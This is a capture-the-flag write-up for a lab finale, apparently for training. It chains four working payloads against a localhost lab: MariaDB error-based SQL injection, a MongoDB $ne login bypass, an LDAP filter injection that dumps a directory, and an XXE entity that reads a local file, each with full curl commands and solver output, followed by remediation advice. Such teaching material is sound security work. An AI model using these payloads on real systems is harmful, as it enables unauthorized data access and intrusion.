# Chairman Election Infiltration — Debrief

**Node:** `f2` &middot; **Flag:** `SEIYAKU{chairman_of_the_loopholes}` &middot; **Routes:** four faction routes + `POST /f/omnigrid/seize` &middot; **Sink:** `challenges/finals.py`, all four real backend engines used across this arc &middot; **Signal:** the Chairman seat's real key, fetched from MariaDB only once all four faction fragments independently verify

## The shape of the finale

This is the arc's closing statement: four completely independent
systems, four completely independent bug classes, and no narrative
pointing you at which technique any one of them wants. Each faction
route below is deliberately built from the exact same sink shape as a
floor you've already solved earlier in the arc — the lesson isn't a new
vulnerability, it's recognizing a familiar shape on unfamiliar ground.

```python
# challenges/finals.py
def f2_seize():
    ...
    true_values = {
        "onboarding": _true_onboarding_fragment(),
        "mobile": _true_mobile_fragment(),
        "directory": _true_directory_fragment(),
        "document": _true_document_fragment(),
    }
    matches = {f: bool(v) and submitted[f] == v for f, v in true_values.items()}
    success = all(matches.values())
```

Every one of the four `_true_*_fragment()` helpers re-derives that
faction's real, current value with a **safe, non-injectable** lookup of
its own — a parameterized SQL query, a fully-specified `find_one()`, a
fixed-DN LDAP search, a direct file read. None of them ever build a
query from the caller-submitted fragment strings. There is no shortcut
past this check: a caller can't inject their way into `/seize` itself,
because nothing about `/seize`'s own logic is vulnerable — the only way
to make all four `matches` entries `True` is to have genuinely extracted
all four real fragments from their real, native systems first.

## Faction 1 — Onboarding (MariaDB, error-based SQLi)

Identical bug and sink shape to Netero's Recipe Vault (p1_2) and F.1's
stage 1:

```python
q = f"SELECT status FROM omnigrid_onboarding WHERE id='{lookup_id}'"
```

Payload:

```
id = 1' AND extractvalue(1,concat(0x3a,(SELECT fragment FROM omnigrid_fragments WHERE faction='onboarding')))-- -
```

Live proof:

```bash
curl -s -G "$BASE/f/omnigrid/onboarding" \
    --data-urlencode "id=1' AND extractvalue(1,concat(0x3a,(SELECT fragment FROM omnigrid_fragments WHERE faction='onboarding')))-- -"
```

Recovers `CHAIR-0NB0ARD-7f2a` in the rendered exception text, exactly
like every earlier error-based floor in this arc.

## Faction 2 — Mobile API (MongoDB, `$ne` auth bypass)

Identical bug and sink shape to the Archive Guardian (p4_2):

```python
query = {"username": username, "password": password}
agent = db.omnigrid_agents.find_one(query)
```

Payload (bracket-notation form fields, same dual-channel support as
p4_2 — a JSON body with `{"$ne": null}` works identically):

```bash
curl -s -X POST "$BASE/f/omnigrid/mobile" -H "Accept: application/json" \
    --data-urlencode 'username[$ne]=1' --data-urlencode 'password[$ne]=1'
```

Recovers `CHAIR-M0B1LE-c91d` from the one seeded `omnigrid_agents`
document — the exact same "reach MongoDB with an operator object instead
of a string" bug as every earlier NoSQL floor.

## Faction 3 — Directory (OpenLDAP, filter-injection dump)

Identical bug and sink shape to the Zodiac Breach (p4_3):

```python
ldap_filter = f"(&(uid={uid})(objectClass=inetOrgPerson))"
```

Payload:

```bash
curl -s -G "$BASE/f/omnigrid/directory" --data-urlencode 'uid=*)(objectClass=*'
```

Widens the filter past what any well-formed single-uid lookup could
match, dumping the whole `ou=omnigrid` roster and recovering
`CHAIR-D1R3CT0RY-4e6b` from `uid=directory-svc`'s `description` — a
field never shown for a clean, non-injected, single-entry match.

## Faction 4 — Document Import (XXE file read)

Identical bug and sink shape to the King's Sealed Archives (p5_3): the
exact same `core.xml_parser.parse()` call, `resolve_entities=True` and
`load_dtd=True` included, feeding a route that echoes back a parsed
element's resolved text.

Payload:

```bash
curl -s -X POST "$BASE/f/omnigrid/import" \
    --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///opt/omnigrid/fragment.txt">]><request><document>&xxe;</document></request>'
```

Recovers `CHAIR-D0CX7Q-9a3f`, read from `/opt/omnigrid/fragment.txt` — a
file sealed outside the app's own source tree, added by the
`Dockerfile`, never served by any other route.

## Seizing the seat

```bash
curl -s -X POST "$BASE/f/omnigrid/seize" -H "Accept: application/json" \
    --data-urlencode "onboarding=CHAIR-0NB0ARD-7f2a" \
    --data-urlencode "mobile=CHAIR-M0B1LE-c91d" \
    --data-urlencode "directory=CHAIR-D1R3CT0RY-4e6b" \
    --data-urlencode "document=CHAIR-D0CX7Q-9a3f"
```

```json
{"flag":"SEIYAKU{chairman_of_the_loopholes}","matches":{"directory":true,"document":true,"mobile":true,"onboarding":true},"success":true}
```

A partial submission (one wrong fragment, three correct) is rejected
outright, with no partial credit and no flag — proving `/seize` isn't
just checking that *a* value was supplied per field, but that every
single one genuinely matches its faction's real current data:

```bash
curl -s -X POST "$BASE/f/omnigrid/seize" -H "Accept: application/json" \
    --data-urlencode "onboarding=CHAIR-0NB0ARD-7f2a" \
    --data-urlencode "mobile=wrong" \
    --data-urlencode "directory=CHAIR-D1R3CT0RY-4e6b" \
    --data-urlencode "document=CHAIR-D0CX7Q-9a3f"
```

```json
{"flag":null,"matches":{"directory":true,"document":true,"mobile":false,"onboarding":true},"success":false}
```

## The full solver, live

`solvers/f2.py` extracts all four fragments live, using each faction's
own injection technique against its own real backend, then seizes the
seat. This is the actual, unedited output of a real run against this
exact seed (`SEIYAKU_BASE` was the default `http://localhost:8000` for
this run):

```
[f2] target: http://localhost:8000/f/omnigrid
[f2] faction 1 — Onboarding (MariaDB, error-based SQLi)
  ok: fragment = 'CHAIR-0NB0ARD-7f2a'
[f2] faction 2 — Mobile API (MongoDB, $ne auth bypass)
  ok: fragment = 'CHAIR-M0B1LE-c91d'
[f2] faction 3 — Directory (OpenLDAP, filter-injection dump)
  ok: fragment = 'CHAIR-D1R3CT0RY-4e6b'
[f2] faction 4 — Document Import (XXE file read)
  ok: fragment = 'CHAIR-D0CX7Q-9a3f'
[f2] seizing the Chairman seat with all four fragments
  response: {'flag': 'SEIYAKU{chairman_of_the_loopholes}', 'matches': {'directory': True, 'document': True, 'mobile': True, 'onboarding': True}, 'success': True}
  ok: Chairman seat seized — flag recovered: SEIYAKU{chairman_of_the_loopholes}
[f2] PASS
```

## HxH analogy

Every faction in OmniGrid did roughly what a real, siloed organization
actually does: secured its own system to whatever standard its own team
thought was reasonable, and assumed the other departments' problems
weren't its concern. None of the four bugs here required breaking any
new ground technically — each one is a bug this arc already taught,
solved once already. What the Chairman's seat actually tested wasn't
depth in any one technique. It was whether you could walk into an
unfamiliar system with no guide pointing at "this is a boolean-blind
floor" or "this is the LDAP one," recognize the shape of the rule being
enforced, and find precisely where that rule was worded imprecisely —
four separate times, in four separate grammars, with nothing in common
between the four factions except that every single one of them made the
same category of mistake, independently, without realizing any of the
others had too.

## Remediation

Every individual faction's fix is identical to its earlier counterpart
in this arc — see Phase 1 (`phase1/README.md`), Phase 4
(`phase4/README.md`), and Phase 5 (`phase5/README.md`) for the complete
per-technique remediation writeups. The lesson specific to this final, worth stating plainly for a
real organization: **"we secured system X"
is not the same claim as "we are secure."** Four departments each doing
reasonably competent security work on their own system, in isolation,
with no shared standard and no cross-team review, still adds up to four
independent ways in — an attacker only has to find the weakest one, not
defeat all four at once. A real security program needs:

- **A shared, organization-wide secure-coding standard** — parameterized
  queries, input type-validation, escaped filter construction, and a
  hardened XML parser configuration — applied consistently across every
  team and every backend, not independently reinvented (or not) by each
  department.
- **Centralized security review**, so a pattern already flagged as
  dangerous in one system (raw string concatenation into a query, an
  unescaped filter, an unhardened parser) gets caught the next four
  times a different team writes the same pattern against a different
  backend.
- **Least-privilege boundaries between departments' systems**, so a
  breach in one faction's stack doesn't automatically compromise the
  shared resource (here, the Chairman seat) that all four converge on —
  segmentation limits exactly this kind of "four independently-secured
  systems, one combined point of failure" outcome.
